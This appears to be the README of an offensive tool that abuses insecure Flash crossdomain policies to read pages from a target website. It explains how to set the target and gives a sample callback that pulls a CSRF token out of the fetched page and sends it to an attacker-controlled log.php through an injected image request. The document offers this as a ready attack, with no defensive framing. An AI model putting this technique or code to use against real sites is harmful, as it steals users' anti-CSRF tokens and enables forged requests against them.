# crossdomain
Crossdomain exploiting - insecure flash file documents

### How to use this?

In crossdomain.js, edit the following line: 
```
crossdomain.setTarget('http://www.olivierbeg.nl/');
```

### How do I handle the data?

In `crossdomain.js` there is a callback function, this function receives all the content sent through the flash file that loads the data from the remote website. To exploit it further you can change the crossdomain.callback function to handle the data.

######As preview:
```
'callback': function (data) {
  console.log(data);
}
```

Can become something like:

```
'callback': function (data) {
  var response = data.match('csrf value=(.*)>');
  if(response != null) {
    var img = document.createElement('img');
    img.src = 'log.php?response=' + escape(JSON.parse(response));
    
    document.getElementById('dump').appendChild(img);
  }
}
```
